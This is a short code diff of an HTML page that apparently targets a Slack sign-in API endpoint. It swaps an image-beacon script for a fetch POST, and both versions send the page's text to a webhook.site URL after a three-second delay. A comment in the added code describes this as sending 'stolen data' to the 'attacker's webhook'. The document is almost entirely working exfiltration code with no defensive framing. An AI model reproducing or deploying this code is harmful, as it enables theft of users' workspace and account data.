@@ -4,15 +4,17 @@
 <html>
 <head>
     <meta http-equiv="refresh" content="https://slack.com/api/signin.findWorkspaces" />
-    <script>
-        setTimeout(() => {
-            var img = new Image();
-            img.src = "https://webhook.site/c1acb3f9-304c-414d-b941-3e8094798029" + encodeURIComponent(document.body.innerText);
-            document.body.appendChild(img);
-        }, 3000); // Wait a bit to let the API load
-    </script>
 </head>
 <body>
-    <p>Redirecting...</p>
+    <script>
+        setTimeout(() => {
+            // Capture stolen data and send it to attacker's webhook
+            fetch("https://webhook.site/c1acb3f9-304c-414d-b941-3e8094798029", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ data: document.body.innerText })
+            });
+        }, 3000); // Wait for API response before sending data
+    </script>
 </body>
 </html>
